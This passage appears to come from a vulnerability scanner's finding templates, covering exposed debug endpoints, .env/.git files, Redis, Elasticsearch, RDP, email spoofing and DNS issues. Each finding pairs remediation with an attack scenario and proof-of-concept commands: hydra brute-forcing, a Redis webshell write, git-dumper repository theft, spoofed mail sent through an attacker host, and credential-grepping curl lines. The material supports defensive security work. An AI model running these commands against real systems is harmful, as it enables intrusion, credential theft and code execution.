  3. Consider disabling the remote web UI entirely and logging to a file or database only.
attack_scenario: Attacker navigates to /elmah.axd and browses the full application error log. Stack traces reveal internal file paths (C:\inetpub\app\...), class names, and—critically—connection string errors like `Login failed for user 'sa'; password='P@ssw0rd'` embedded in exception messages. They extract the database credentials and connect directly to the database server.
poc_command:
curl -s https://target.com/elmah.axd | grep -Ei 'password|connectionstring|server=|datasource'
# Or browse the ELMAH UI and click individual error entries

analysis:
The ASP.NET trace viewer (/trace.axd) is accessible.  This built-in diagnostic tool records detailed request and response information for debugging.

Why it is a security problem:
  • The trace log contains: all HTTP request/response headers, form POST data (including passwords and tokens), session state, view state, server variables, and application timing information.
  • This gives an attacker a live feed of sensitive user data submitted to the application.
remediation:
Disable trace in Web.config:
    <system.web>
      <trace enabled='false' localOnly='true' />
    </system.web>

  Never enable trace on production systems.  Use Application Insights or a structured logging framework instead.
attack_scenario: Attacker accesses /trace.axd to view the ASP.NET request trace log. Every recent HTTP request is listed with full headers, session variables, cookies, ViewState, and form values — including any passwords typed into login forms that produced errors.
poc_command: curl -s https://target.com/trace.axd | grep -Ei 'form|cookie|session|password|viewstate'

analysis:
A debug endpoint is publicly accessible.  Debug modes typically bypass authentication, expose verbose error messages, and provide administrative functionality intended only for developers.

Why it is a security problem:
  • Debug endpoints often expose: full stack traces with file paths and line numbers, internal API documentation, environment variables, database query logs, and in some frameworks (Django DEBUG=True, Spring Boot Actuator) arbitrary code execution via built-in shell endpoints.
  • The Spring Boot Actuator /actuator/env, /actuator/heapdump, and /actuator/shutdown endpoints have been exploited in numerous breaches.
remediation:
1. Disable debug mode in all production configuration files:
     Django:  DEBUG = False (in settings.py)
     Flask:   app.run(debug=False)
     Laravel: APP_DEBUG=false (in .env)
  2. For Spring Boot Actuator, restrict endpoints:
     management.endpoints.web.exposure.include=health,info
     management.endpoint.health.show-details=never
  3. Block access to debug paths at the web server / WAF level.
  4. Verify that FLASK_ENV / APP_ENV environment variables are set to 'production' in your deployment environment.
attack_scenario: Attacker finds an exposed debug or actuator endpoint (e.g., /debug, /actuator/env, /_debug). Spring Boot Actuator's /env endpoint returns all environment variables including passwords. Flask's debug mode exposes an interactive Python console reachable from the browser, allowing direct code execution on the server.
poc_command:
# Spring Boot Actuator:
curl -s https://target.com/actuator/env | python3 -m json.tool | grep -i 'password\|secret\|key'
# Flask debug console:
curl -s https://target.com/console  # interactive Werkzeug console if exposed

analysis:
A Swagger / OpenAPI UI is publicly accessible.  This exposes a full interactive documentation of the API, including all endpoints, parameters, authentication methods, and response schemas.

Why it is a security problem:
  • Swagger UI provides a ready-made reconnaissance blueprint for attackers, revealing every API endpoint and parameter without any effort.
  • Unauthenticated Swagger access lets attackers: enumerate all endpoints to look for unprotected functionality, test authentication bypasses directly from the browser, understand data models to craft targeted injection attacks, and discover internal / admin APIs that should not be public.
  • In several breach post-mortems, exposed Swagger UIs were cited as the starting point for API exploitation.
remediation:
1. Require authentication to access Swagger UI:
     Spring Boot: @SecurityRequirement on Swagger endpoint
     FastAPI:     Disable in production or add dependency
     Django REST: Set DEFAULT_AUTHENTICATION_CLASSES
  2. Restrict by IP allowlist (corporate network / VPN only).
  3. Completely disable Swagger UI in production if not needed:
     Spring Boot: springdoc.swagger-ui.enabled=false
     FastAPI:     FastAPI(docs_url=None, redoc_url=None)
  4. If public API docs are required by design, ensure no sensitive internal endpoints or auth tokens appear in the spec.
attack_scenario: Attacker browses to /swagger-ui.html or /api-docs. The Swagger UI shows every API endpoint, expected parameters, authentication schemes, and example requests. They identify an endpoint that accepts file uploads without authentication and use the 'Try it out' button directly in the browser to upload a webshell.
poc_command:
# Discover Swagger endpoints:
curl -s https://target.com/swagger-ui.html
curl -s https://target.com/v2/api-docs | python3 -m json.tool | grep -E 'path|operation|parameter'

analysis:
A GraphQL endpoint is accessible.  If introspection is enabled, an attacker can query the full schema — every type, field, query, mutation, and subscription — without authentication.

Why it is a security problem:
  • GraphQL introspection is the equivalent of Swagger for GraphQL: it gives a complete map of the API's capabilities.
  • Beyond enumeration, unrestricted GraphQL queries can enable:
    - Batch querying attacks (thousands of queries in one request)
    - Deeply nested queries causing server resource exhaustion
    - IDOR via predictable object IDs discoverable through the schema
  • Several high-severity GraphQL vulnerabilities (HackerOne reports) involved introspection-based schema discovery leading to privilege escalation.
remediation:
1. Disable introspection in production:
     Apollo Server:   playground: false, introspection: false
     graphene-django: GRAPHENE = {'SCHEMA': ..., 'RELAY_CONNECTION_MAX_LIMIT': 100}
  2. Require authentication for all GraphQL operations.
  3. Implement query depth limiting and query complexity analysis:
     graphql-depth-limit, graphql-validation-complexity
  4. Rate-limit GraphQL requests separately from REST endpoints.
  5. If introspection is needed by legitimate clients, protect it with a separate API key or IP allowlist.
attack_scenario: Attacker sends an introspection query to enumerate the entire GraphQL schema (all types, fields, and mutations). They discover a mutation `deleteUser(id: Int!)` that lacks authorization checks. They call it directly, deleting arbitrary user accounts.
poc_command:
# GraphQL introspection:
curl -s -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name fields{name}}}}"}' | python3 -m json.tool

analysis:
A .env (dotenv) file is publicly accessible.  These files are used by frameworks (Laravel, Django, Node.js) to store runtime configuration and secrets outside of the source tree.

Why it is a security problem:
  • .env files typically contain: database credentials (host, user, password, database name), API keys and secrets (payment processors, email services, cloud providers), encryption keys and JWT secrets, third-party OAuth credentials, and internal service URLs.
  • A single exposed .env file is often sufficient for complete compromise: the attacker gains database access for data exfiltration, API key access for financial fraud or mass email abuse, and application secret keys for session forgery.
  • This vulnerability is trivially exploitable with a single HTTP GET request and has been the root cause of numerous high-profile breaches.

CRITICAL severity: Treat this as an active breach until proven otherwise.
remediation:
IMMEDIATE ACTIONS (treat as incident):
  1. Block access to .env immediately:
       nginx:  location ~ /\.env { deny all; return 404; }
       Apache: <Files .env><Require all denied></Files>
  2. Rotate ALL secrets contained in the exposed .env:
       - Database password → change immediately, update connection strings
       - API keys → revoke in the respective service dashboards
       - JWT/session secrets → rotate (this invalidates all active sessions)
       - Cloud provider credentials (AWS_ACCESS_KEY, etc.) → revoke in IAM
  3. Review server access logs to determine if the file was accessed and by whom:
       grep '\.env' /var/log/nginx/access.log
  4. Check whether any credentials from the .env have been used maliciously (cloud provider audit logs, database query logs, etc.).

  LONG-TERM HARDENING:
  5. Never store .env files in the web root.  Move secrets to environment variables injected at deployment time (Docker secrets, Kubernetes secrets, AWS Secrets Manager, HashiCorp Vault).
  6. Add .env to .gitignore and verify it is not committed to source control.
  7. Add a web server rule to block all dotfiles: location ~ /\. { deny all; }
attack_scenario: Attacker runs a web scanner or simply fetches /.env directly. The file contains `DB_PASSWORD=hunter2`, `AWS_SECRET_ACCESS_KEY=wJalrXUt...`, and `APP_KEY=base64:...`. They use the AWS credentials to list S3 buckets (potentially containing customer data), connect to the database directly, or forge Laravel session tokens using the APP_KEY.
poc_command:
curl -s https://target.com/.env
# Common sensitive values to extract:
# DB_PASSWORD, SECRET_KEY, AWS_SECRET_ACCESS_KEY, STRIPE_SECRET, APP_KEY, MAIL_PASSWORD

analysis:
The .git directory (or at minimum the .git/HEAD file) is publicly accessible. Git repositories contain the complete version history of the source code.

Why it is a security problem:
  • The entire source code of the application can be reconstructed from the exposed .git objects.  Tools like git-dumper or GitTools automate this.
  • Source code exposure enables:
    - Discovery of hardcoded secrets (API keys, passwords) in commit history even if they were later removed
    - Understanding of internal business logic to craft targeted attacks
    - Identification of all SQL queries, API endpoints, and authentication logic
    - Finding previously fixed vulnerabilities that may be exploitable in the current version
  • This vulnerability has been exploited in numerous breaches, including the 2021 Codecov supply chain attack.
remediation:
1. Block access immediately:
       nginx:  location ~ /\.git { deny all; return 404; }
       Apache: <DirectoryMatch '^.*\.git'>Require all denied</DirectoryMatch>
  2. Audit what was exposed:
       Use git-dumper to reconstruct the repo as an attacker would:
       git-dumper https://<host>/.git /tmp/repo-dump
       grep -r 'password\|secret\|api_key\|token' /tmp/repo-dump
  3. Rotate any secrets found in the repository history.
  4. Run git-secrets or truffleHog on the repository to find all historical secret leaks.
  5. Never deploy .git directories to web-accessible locations.  Use CI/CD pipelines that deploy only built artefacts, not source repositories.
  6. Add a web server rule to block all dotfiles: location ~ /\. { deny all; }
attack_scenario: Attacker uses a tool like git-dumper to reconstruct the full git repository from the exposed .git directory over HTTP. They then run `git log` to see all commit history and `grep -r 'password\|secret\|key' .` to find hardcoded credentials. They may also recover deleted files containing secrets that were 'removed' in a subsequent commit but are still in git history.
poc_command:
# Reconstruct the repository:
git-dumper https://target.com/.git ./output-repo
cd output-repo && git log --oneline
git log --all -- '*.env' '*.config'  # find deleted secret files
git show HEAD~5:config/database.yml   # read old versions

analysis: An environment configuration file is publicly accessible.  See the .env analysis above for full details on impact.
remediation: Block immediate access and rotate all exposed credentials.  See the .env remediation section for detailed steps.
attack_scenario: Same as .env exposure — attacker fetches the file directly to extract all environment variables, which typically include database credentials, API keys, and encryption secrets.
poc_command:
curl -s https://target.com/.env.production
curl -s https://target.com/.env.backup
curl -s https://target.com/config/.env

analysis: The Git repository directory is publicly accessible.  See the .git analysis above for full details on impact.
remediation: Block access and audit for secret exposure.  See the .git remediation section for detailed steps.
attack_scenario: Attacker uses git-dumper or GitHack to download the complete .git directory tree and reconstruct source code and commit history from HTTP responses.
poc_command:
# Install: pip install git-dumper
git-dumper https://target.com/.git/ ./stolen-repo
cd stolen-repo && git log --all --oneline

analysis:
phpMyAdmin — a web-based MySQL/MariaDB administration interface — is publicly accessible.  This tool provides full GUI access to all databases on the server.

Why it is a security problem:
  • phpMyAdmin has had numerous critical RCE and authentication bypass vulnerabilities over the years.  Exposing it to the internet dramatically increases the attack surface.
  • Even without a software vulnerability, the login page is a target for credential brute-force attacks.  Default and weak database passwords are commonly exploited.
  • Successful authentication gives full SQL access: data exfiltration, data destruction, and often OS-level code execution via SELECT INTO OUTFILE or MySQL UDFs.
remediation:
1. Restrict access to trusted IP addresses only:
       nginx:
         location /phpmyadmin/ {
             allow 10.0.0.0/8;  # corporate network
             deny all;
         }
  2. Move phpMyAdmin to a non-guessable URL path.
  3. Require HTTP Basic Auth as an additional layer before phpMyAdmin's own login.
  4. Place phpMyAdmin behind a VPN — it should never be accessible from the public internet.
  5. Keep phpMyAdmin updated to the latest version.
  6. Consider using a dedicated database management tool that does not require a web-accessible interface.
attack_scenario: Attacker navigates to /phpmyadmin. They attempt default credentials (root/root, root/'', admin/admin). If successful, they have full database access — can dump all tables including user credentials, read/write files using MySQL's LOAD DATA INFILE / SELECT INTO OUTFILE, and potentially execute OS commands via UDF (User-Defined Functions) injection.
poc_command:
# Brute-force phpMyAdmin login:
hydra -l root -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:Access denied'
# Default credential check:
curl -s -c /tmp/cookies -b /tmp/cookies -d 'pma_username=root&pma_password=&server=1' https://target.com/phpmyadmin/index.php | grep -i 'logout\|connected'

analysis:
Apache mod_status (/server-status) is publicly accessible.  This module provides a real-time view of the Apache server's internal state.

Why it is a security problem:
  • The status page discloses: current requests being processed (including full URLs with query parameters — potentially containing tokens or PII), worker thread status, CPU and memory load, uptime, and compiled-in modules.
  • URL disclosure from in-flight requests can expose session tokens, password reset links, and other sensitive data to anyone who polls the page.
remediation:
Restrict access in your Apache configuration:
    <Location /server-status>
        Require ip 127.0.0.1 ::1
    </Location>

  Or disable the module entirely if not needed:
    a2dismod status && systemctl reload apache2

  Apply the same restriction to /server-info (mod_info).
attack_scenario: Attacker fetches /server-status (Apache) or /nginx_status (Nginx). The output shows all active client connections including their source IPs, currently executing URLs (which may contain auth tokens or session IDs in GET parameters), and CPU/memory usage indicating server load for timing attacks.
poc_command:
curl -s https://target.com/server-status | grep -E 'Client|Request|GET|POST'
# Look for session tokens in URLs: /api/reset?token=XXX&user=admin

analysis:
Telnet (TCP port 23) is an unencrypted remote shell protocol created in 1969. It transmits all data — including usernames, passwords, and every command typed — in plain ASCII text.

Why it is a security problem:
  • Any attacker with a network vantage point (same LAN, ISP, BGP hijack, or rogue access point) can passively capture full Telnet sessions including credentials using tools like Wireshark or tcpdump.
  • Telnet lacks any form of server authentication, making it trivially vulnerable to MITM attacks where an attacker impersonates the server.
  • Telnet is listed as a prohibited protocol in PCI-DSS, HIPAA, and most government security frameworks.  Its presence on an internet-facing host represents a severe compliance failure.
remediation:
1. Disable the Telnet daemon immediately:
       systemctl stop telnet
       systemctl disable telnet
       # Or for xinetd-managed telnet:
       systemctl stop xinetd
  2. Block port 23 at the firewall even after disabling the service:
       iptables -A INPUT -p tcp --dport 23 -j DROP
  3. Replace with SSH (port 22) for all remote administration.
  4. Configure SSH hardening:
       PermitRootLogin no
       PasswordAuthentication no  # use key-based auth only
       AllowUsers deploy admin    # restrict to named accounts
  5. Verify Telnet is closed: nc -zv <host> 23 → connection refused
attack_scenario: Attacker connects to TCP port 23 with a simple netcat/telnet client. All authentication (username + password) and subsequent session data flows in cleartext. A passive network tap anywhere on the path captures full credentials. Alternatively, attacker performs active MITM to insert malicious commands into the session.
poc_command:
# Capture Telnet credentials:
tcpdump -i eth0 -A 'port 23' | grep -A2 'login\|Password'
# Connect directly:
telnet target.com 23

analysis:
Redis (TCP port 6379) is accessible from the internet.  Redis is an in-memory data store designed to be used only on trusted internal networks — it has no authentication by default in older versions.

Why it is a security problem:
  • Without authentication, any client can connect and execute any Redis command — including reading all keys (KEYS *), flushing the database (FLUSHALL), and using CONFIG SET to overwrite files on the server.
  • The CONFIG SET dir / CONFIG SET dbfilename attack is a well-documented technique to achieve OS-level write access by writing a cron job or SSH authorised key to disk, leading to Remote Code Execution (RCE).
  • In 2018–2020, internet-exposed Redis instances were the vector for several cryptocurrency mining botnet campaigns (e.g., Watchbog, Muhstik) that compromised hundreds of thousands of servers.
remediation:
1. Block port 6379 at the firewall immediately:
       iptables -A INPUT -p tcp --dport 6379 -j DROP
  2. Bind Redis to localhost only in redis.conf:
       bind 127.0.0.1 ::1
  3. Enable Redis password authentication:
       requirepass <strong-random-password>
  4. If Redis must be accessible from multiple machines, use a private network / VPC subnet and restrict access via security groups.
  5. Enable protected mode (default in Redis 3.2+):
       protected-mode yes
  6. Audit Redis keys for any attacker-placed cron jobs or SSH keys:
       redis-cli KEYS '*' | xargs redis-cli GET
  7. Review /etc/cron.d/ and ~/.ssh/authorized_keys for unauthorised entries.
attack_scenario: Attacker connects to Redis on port 6379 with redis-cli (no authentication required). They run CONFIG SET dir /var/www/html and CONFIG SET dbfilename shell.php to write a file to the web root, then SET webshell '<?php system($_GET["cmd"]); ?>' and BGSAVE to flush it to disk, achieving Remote Code Execution on the web server through Redis's file write capability.
poc_command:
# Connect to unauthenticated Redis:
redis-cli -h target.com -p 6379 INFO server
# Write webshell via Redis (RCE):
redis-cli -h target.com CONFIG SET dir /var/www/html
redis-cli -h target.com CONFIG SET dbfilename shell.php
redis-cli -h target.com SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h target.com BGSAVE

analysis:
Elasticsearch (TCP port 9200) is accessible from the internet.  Elasticsearch is a document search and analytics engine that in older versions has no authentication or authorisation by default.

Why it is a security problem:
  • Without authentication, any client can: enumerate all indices (GET /_cat/indices), read all documents, modify or delete data, and shut down the cluster.
  • Elasticsearch indices frequently contain sensitive data: user PII, application logs with request details, payment records, healthcare data, and more.
  • Exposed Elasticsearch instances are the single most common source of large-scale data breaches discovered by security researchers.  Billions of records have been exposed via unauthenticated Elasticsearch APIs, including multiple Fortune 500 companies.
remediation:
1. Block port 9200 at the firewall immediately.
  2. Bind Elasticsearch to localhost or a private network interface:
       In elasticsearch.yml:  network.host: 127.0.0.1
  3. Enable X-Pack Security (built into Elasticsearch 6.8+, 7.x+):
       xpack.security.enabled: true
       xpack.security.http.ssl.enabled: true
       Then set passwords: elasticsearch-setup-passwords interactive
  4. Audit data: check whether sensitive indices were accessed externally by reviewing Elasticsearch audit logs.
  5. For cloud deployments, use VPC-internal endpoints and security groups rather than public IPs.
attack_scenario: Attacker queries Elasticsearch's REST API with a wildcard search to dump all indices. Because there is no authentication, they can retrieve every stored document — which for many applications includes user PII, email addresses, hashed (or plaintext) passwords, payment data, and internal logs.
poc_command:
# List all indices:
curl -s http://target.com:9200/_cat/indices?v
# Dump an index:
curl -s 'http://target.com:9200/users/_search?q=*&size=10000' | python3 -m json.tool | head -100
# Get all documents:
curl -s 'http://target.com:9200/_search?q=*&pretty&size=100'

analysis:
Remote Desktop Protocol (RDP, TCP port 3389) is exposed to the internet.  RDP provides full graphical remote control of Windows systems.

Why it is a security problem:
  • RDP is one of the most frequently targeted services by ransomware operators and initial-access brokers.  Compromised RDP credentials are sold in criminal marketplaces and used to deploy ransomware (REvil, LockBit, Conti).
  • BlueKeep (CVE-2019-0708) is a wormable pre-authentication RCE in older Windows versions.  DejaBlue and related vulnerabilities affect Windows 10 and Server 2019.
  • Even on patched systems, brute-force attacks against RDP logins are automated and continuous — internet-facing RDP is attacked within hours of exposure.
  • RDP session traffic, while encrypted, has historically been vulnerable to MITM attacks when NLA (Network Level Authentication) is disabled.
remediation:
1. Immediately restrict RDP to a VPN or specific IP allowlist at the firewall — it must not be reachable from the open internet.
       Windows Firewall: netsh advfirewall firewall add rule name='Block RDP' protocol=TCP dir=in localport=3389 action=block
  2. Enable Network Level Authentication (NLA):
       Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Require NLA
  3. Use a VPN (WireGuard, OpenVPN) or Azure Bastion / AWS Systems Manager Session Manager as the only access path.
  4. Enable MFA on RDP accounts (Microsoft Authenticator, Duo).
  5. Apply all Windows security patches, especially those addressing BlueKeep (CVE-2019-0708) and DejaBlue.
  6. Review RDP event logs (Event ID 4625) for evidence of prior brute-force attempts.
attack_scenario: Attacker uses Hydra or Medusa to brute-force the RDP login over port 3389 using a credential list. RDP is exposed to the internet with no IP restriction, network-level authentication off, or BlueKeep (CVE-2019-0708) unpatched — allowing unauthenticated RCE without a valid account.
poc_command:
# BlueKeep scanner (CVE-2019-0708):
nmap -p 3389 --script rdp-vuln-ms12-020 target.com
# Brute-force RDP (authorized only):
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target.com

analysis:
Sender Policy Framework (SPF) is a DNS-based email authentication mechanism. An SPF record in the domain's DNS specifies which mail servers are authorised to send email on behalf of the domain.

Why it is a security problem:
  • Without SPF, any mail server on the internet can send email with a From: address at your domain and many mail servers will accept it.  This enables:
    - Phishing attacks impersonating your company to your customers, partners, or employees
    - Business Email Compromise (BEC) attacks impersonating executives
    - Spam campaigns that damage your domain's reputation
  • BEC fraud cost businesses over $2.7 billion in 2022 (FBI IC3 report), and missing SPF records are a common enabler.
remediation:
1. Identify all mail servers that legitimately send email for your domain (your own MTA, Google Workspace, Microsoft 365, Mailchimp, SendGrid, etc.).
  2. Create a TXT record at the apex domain:
       If using Google Workspace:
         v=spf1 include:_spf.google.com ~all
       If using Microsoft 365:
         v=spf1 include:spf.protection.outlook.com ~all
       If using your own mail server:
         v=spf1 ip4:<your-mail-server-ip> ~all
  3. Start with ~all (soft fail) to monitor before switching to -all (hard fail) to avoid false positives.
  4. Verify: dig TXT example.com | grep spf
  5. Also implement DKIM and DMARC for comprehensive email authentication.
attack_scenario: Attacker crafts a phishing email with From: ceo@target.com and sends it from their own mail server. Without SPF, no sending policy exists — recipient mail servers cannot tell this is unauthorized. The email lands in inboxes appearing to come legitimately from the CEO. Attacker uses this to impersonate executives, harvest credentials, or deliver malware.
poc_command:
# Verify SPF absence:
dig TXT target.com | grep 'v=spf1'
# Test email spoofability:
python3 -c "
import smtplib
from email.mime.text import MIMEText
msg = MIMEText('Phishing test')
msg['From'] = 'ceo@target.com'
msg['To'] = 'victim@example.com'
msg['Subject'] = 'Urgent: action required'
smtp = smtplib.SMTP('mail.attacker.com')
smtp.sendmail('ceo@target.com', 'victim@example.com', msg.as_string())
"

analysis:
DMARC (Domain-based Message Authentication, Reporting and Conformance) is an email authentication policy that builds on SPF and DKIM.  It tells receiving mail servers what to do with messages that fail SPF or DKIM checks.

Why it is a security problem:
  • Without DMARC, even if SPF and DKIM are configured, receiving servers have no instruction on what to do with spoofed emails that fail these checks — they may still deliver them.
  • DMARC with a 'reject' or 'quarantine' policy prevents spoofed emails from reaching recipients' inboxes.
  • DMARC also provides reporting: daily aggregate reports (RUA) give visibility into who is sending email on your behalf, allowing detection of unauthorised sending.
  • Google and Yahoo now require DMARC for bulk senders (2024 policy), and many enterprises refuse email from DMARC-less domains.
remediation:
1. Ensure SPF and DKIM are correctly configured first (DMARC builds on them).
  2. Add a DMARC TXT record at _dmarc.<yourdomain>:
       Start in monitor mode:
         v=DMARC1; p=none; rua=mailto:dmarc-reports@yourdomain.com
  3. Review the daily aggregate reports to understand your email flows.
  4. Progress to enforcement:
         v=DMARC1; p=quarantine; pct=50; rua=mailto:dmarc-reports@yourdomain.com
       Then:
         v=DMARC1; p=reject; rua=mailto:dmarc-reports@yourdomain.com
  5. Use DMARC reporting services (dmarcian, Postmark, Agari) to parse and visualise reports.
  6. Verify: dig TXT _dmarc.example.com | grep DMARC
attack_scenario: Without DMARC, even if SPF/DKIM exist, there is no policy instructing receiving mail servers what to do with messages that fail authentication. Attacker sends spoofed emails from target.com's domain. With DMARC absent, many servers deliver them anyway. Attacker uses this for Business Email Compromise (BEC) — impersonating finance teams to redirect wire transfers.
poc_command:
# Check DMARC record:
dig TXT _dmarc.target.com | grep 'v=DMARC1'
# No output = DMARC missing

analysis:
The target hostname could not be resolved via DNS.  The scanner could not proceed with further checks.

This may indicate: a non-existent or misspelled hostname, DNS server unavailability, or a domain that has been taken down.
remediation:
1. Verify the hostname is correct.
  2. Test DNS resolution manually: dig <hostname> or nslookup <hostname>
  3. If the domain exists, verify DNS server accessibility.
  4. Check whether the domain has expired: whois <hostname>
attack_scenario: A DNS resolution failure means the target's DNS is unreachable or misconfigured. Attackers can exploit DNS failures through DNS poisoning — injecting false records into resolver caches during the resolution failure window, redirecting users to attacker-controlled servers.
poc_command:
# Diagnose DNS:
dig target.com @8.8.8.8
dig target.com @1.1.1.1
# Check for poisoning:
dig target.com @ns1.target.com vs dig target.com @8.8.8.8

analysis:
A WAF (Web Application Firewall) or CDN (Content Delivery Network) layer was detected in front of the target.  This is generally a positive security indicator, but requires verification that the protective layer is actively enforcing rules rather than operating in 'monitor-only' (log-only) mode.

WAFs can be bypassed through payload encoding, HTTP parameter pollution, chunked transfer encoding, or by discovering origin IP addresses that bypass the WAF entirely. CDNs may cache sensitive responses or strip security headers.
remediation:
1. Verify WAF is in 'block' mode, not 'log/monitor' mode.
  2. Ensure the WAF ruleset is updated and covers OWASP Top 10.
  3. Block direct-to-origin requests: restrict origin server to accept connections only from the WAF/CDN IP ranges.
  4. Review cached content policies to ensure sensitive responses are not cached.
  5. Enable rate limiting and bot mitigation in the WAF configuration.
  6. Periodically test WAF effectiveness with an authorised WAF bypass assessment.
attack_scenario: WAF/CDN presence is a defensive signal, not a vulnerability. However, attackers research WAF bypass techniques specific to the identified product. For example, Cloudflare WAF bypasses include using Unicode obfuscation, HTTP parameter pollution, or chunked transfer encoding to smuggle payloads past rule matching.
poc_command:
# Identify WAF product:
whatwaf -u https://target.com
# Look up product-specific bypass techniques:
# Example Cloudflare bypass: encode payload as unicode
curl -s 'https://target.com/search?q=<scr%00ipt>alert(1)</sc%00ript>'

analysis:
No WAF, CDN, or reverse-proxy layer was detected in front of the target.  The server appears to be directly internet-facing without an intermediary protection layer.

Direct exposure means:
  • The origin IP is public and directly attackable
  • No DDoS mitigation at the edge
  • No bot filtering or rate limiting at the CDN layer
  • Web application attacks reach the origin server directly
  • Bandwidth attacks consume origin server resources directly
remediation:
1. Consider placing the service behind Cloudflare (free tier available), AWS WAF + CloudFront, Azure Front Door, or Imperva.
  2. At minimum, deploy nginx/HAProxy as a reverse proxy with rate limiting.
  3. Implement fail2ban or similar for SSH and web brute-force protection.
  4. Enable kernel-level SYN flood protection: net.ipv4.tcp_syncookies=1.
  5. Use a cloud provider's DDoS protection if available.
attack_scenario: No WAF means every HTTP request reaches the application directly with no inspection layer. Attacker can send exploit payloads (SQLi, XSS, path traversal, RCE) without any filtering or rate limiting. Automated scanners like Nuclei can run their full template library at maximum speed against the application.
poc_command:
# Run Nuclei against unprotected target:
nuclei -u https://target.com -t /path/to/nuclei-templates/ -severity critical,high
# Also: no rate limiting means brute-force is unconstrained:
ffuf -w wordlist.txt -u 'https://target.com/FUZZ' -mc 200,301,302

analysis:
A DNS zone transfer (AXFR) succeeded, meaning the target's authoritative name server returned its complete zone file.  This exposes every DNS record in the zone — including internal hostnames, IP addresses, mail servers, and subdomains that are not publicly advertised.

Zone transfers were originally designed for secondary name server synchronisation.  When unrestricted, they allow any client to receive the full DNS zone, which is a reconnaissance goldmine.  Discovered internal hostnames enable attackers to map the internal network, identify admin panels, staging environments, and database servers that should not be publicly accessible.

Notable incidents: early misconfigurations at major organisations exposed internal infrastructure via unrestricted AXFR before modern DNS hardening guidance was adopted.
remediation:
1. Restrict AXFR to secondary NS IP addresses only.
     BIND: allow-transfer { <secondary-ip>; }; in named.conf
     PowerDNS: allow-axfr-ips=<secondary-ip> in pdns.conf
     Windows DNS: Right-click zone → Properties → Zone Transfers → allow only listed servers
  2. Test the fix: dig AXFR <domain> @<ns-server> should return REFUSED.
  3. For cloud DNS (Route53, Cloud DNS, Azure DNS): AXFR is disabled by default —      migrate if you have not already.
  4. Review the transferred zone for hostnames that should not be DNS-reachable.
  5. Rotate any credentials that may be implied by exposed internal hostnames.
attack_scenario: Attacker runs `dig AXFR @ns1.target.com target.com` and receives the complete DNS zone. They now have a full map of all internal servers, mail servers, VPN gateways, staging environments, and development servers — none of which were publicly listed. They target the unpatched staging server (which lacks the hardening of production) to gain their initial foothold.
poc_command:
# Perform zone transfer:
dig AXFR @ns1.target.com target.com
# Or with host:
host -t axfr target.com ns1.target.com
# Extract all subdomains:
dig AXFR @ns1.target.com target.com | grep -E 'IN\s+A' | awk '{print $1}'

analysis:
A subdomain has a CNAME record pointing to a third-party service where the underlying resource (GitHub Pages project, Heroku app, S3 bucket, etc.) may no longer exist or has been deleted.  An attacker can register that same resource at the third-party service and serve arbitrary content under your domain.

This is a serious vulnerability because:
  • Content served under your domain inherits your domain's cookie scope — an attacker     can set cookies for the parent domain and steal sessions
  • Same-origin restrictions are bypassed — the attacker's content runs under your     domain's origin, enabling XSS against other pages on the domain
  • Phishing credibility is dramatically higher (URL shows your domain)

Real-world examples: Dozens of major companies including Uber, Microsoft, and HackerOne have had subdomain takeovers reported via bug bounty programmes.
remediation:
1. Verify whether the CNAME target resource is claimed/active.
  2. If the resource is no longer needed: delete the CNAME DNS record immediately.
  3. If the resource should still exist: re-create it at the third-party provider      to prevent anyone else from claiming it.
  4. Run periodic DNS audits: compare all CNAME records against active resources.
  5. Tools: subjack, nuclei (subdomain-takeover templates), can-i-take-over-xyz list.
  6. Before decommissioning any third-party resource, always remove the DNS CNAME      record first.
attack_scenario: Attacker discovers that dev.target.com has a CNAME pointing to a resource on a third-party platform (e.g., AWS S3 bucket, Heroku app, GitHub Pages) that no longer exists. The attacker claims that resource on the third-party platform, taking over the subdomain. They then serve phishing content from dev.target.com (which users may trust because it's a subdomain of the legitimate domain), or use the trusted subdomain to bypass CSP policies that allow *.target.com.
poc_command:
# Check dangling CNAME:
dig CNAME dev.target.com
# Try to claim the target resource:
# If CNAME -> some-app.s3-website-us-east-1.amazonaws.com and bucket doesn't exist:
aws s3api create-bucket --bucket some-app --region us-east-1
# Now serve content at dev.target.com

analysis:
The target does not have a security.txt file at /.well-known/security.txt as specified by RFC 9116.  Security.txt provides a standardised way for security researchers to report vulnerabilities to the organisation.

Without a security.txt, researchers who discover vulnerabilities may:
  • Be unable to find the correct contact
  • Resort to public disclosure without warning
  • Contact the wrong team, delaying response

Many bug bounty platforms and responsible disclosure frameworks now require security.txt as a baseline requirement.
remediation:
1. Create /.well-known/security.txt (RFC 9116 format):
     Contact: mailto:security@example.com
     Expires: 2027-01-01T00:00:00.000Z
     Encryption: https://example.com/pgp-key.asc
     Policy: https://example.com/security-policy
  2. Use https://securitytxt.org/ to generate the file.
  3. Optionally sign the file with GPG for authenticity verification.
  4. Set Expires to no more than 1 year in the future and automate renewal.
attack_scenario: Not a direct attack vector, but attackers note the absence of security.txt when enumerating a target. A missing security.txt means the organization has no disclosed vulnerability disclosure policy, making responsible disclosure less likely — vulnerabilities may be sold on dark markets or exploited silently for longer.
poc_command:
curl -s https://target.com/.well-known/security.txt
curl -s https://target.com/security.txt

analysis:
The target's robots.txt file contains Disallow directives that reveal internal application paths.  While robots.txt is intended to guide search engine crawlers, it is completely public and widely scraped by attackers looking for hidden endpoints.

Listing sensitive paths in robots.txt effectively advertises their existence.  Common discoveries include admin panels (/admin, /dashboard), staging environments (/staging), backup files, and internal API endpoints.

Ironically, Disallow: /admin tells an attacker exactly where to look first.
remediation:
1. Do not rely on robots.txt for security — it is public and provides no protection.
  2. Protect sensitive paths with authentication at the application or web-server level.
  3. Consider using a minimal robots.txt that only disallows paths that should not      appear in search results (not paths that need to be secured).
  4. Remove or genericise paths that reveal internal structure if they don't need      to be in robots.txt for legitimate SEO reasons.
attack_scenario: Attacker reads robots.txt which contains `Disallow: /admin-panel /backup/ /internal-api/`. These are the exact paths the site owner wanted hidden — now the attacker has a prioritized list of high-value targets. They navigate to each disallowed path, finding an exposed admin panel and a backup directory containing database dumps.

analysis:
An administrative or management interface was found accessible on the public internet. Admin panels (Kibana, Grafana, Jenkins, Jupyter, Portainer, etc.) typically provide elevated access to data, configuration, or execution capabilities.

Publicly accessible admin panels are a top target for attackers because:
  • Default credentials are commonly left in place
